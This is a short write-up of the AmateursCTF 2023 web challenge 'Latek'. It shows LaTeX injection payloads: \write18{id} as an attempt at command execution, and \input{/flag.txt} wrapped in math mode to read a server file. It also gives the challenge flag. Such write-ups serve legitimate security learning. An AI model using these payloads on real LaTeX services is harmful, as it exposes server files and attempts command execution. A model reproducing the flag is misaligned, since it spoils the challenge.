Web/Latek

![image](https://github.com/AbzeeSaminu/AmateursCTF-2023/assets/113645443/e1116132-cd8a-4cdf-a935-b773cf25864f)

Latek which is Latex is a pretty cool challenge and very easy, you can find about Latex injection on hacktricks or any other website so let get to the fun part by visiting the challenge webpage.

![image](https://github.com/AbzeeSaminu/AmateursCTF-2023/assets/113645443/3f05964d-19a9-4e07-a5e3-fb657a0d061e)

I tried to execute command using this ```\write18{id}``` but unfortuanately the runsystem has been disable then I decided to try out this payload to read the content of the flag.
```
\documentclass{article}
\begin{document}
\input{/flag.txt}
\end{document}
```
In Latex injection you can use this command ```\input{command}``` to read files only.

![image](https://github.com/AbzeeSaminu/AmateursCTF-2023/assets/113645443/4c7d4688-7e01-448b-aa42-5cf3cc152c0a)

We got an incomplete flag but looking at the error it gave out, We are missing a dollar sign $ in our payload so let add it to the payload.
```
\documentclass{article}
\begin{document}
$\input{/flag.txt}$
\end{document}
```

![image](https://github.com/AbzeeSaminu/AmateursCTF-2023/assets/113645443/cebf683e-f26e-4730-843e-e378924363e1)

And boom we have our flag.

Flag: amateursCTF{th3_l0w_budg3t_and_n0_1nstanc3ing_caus3d_us_t0_n0t_all0w_rc3_sadly}
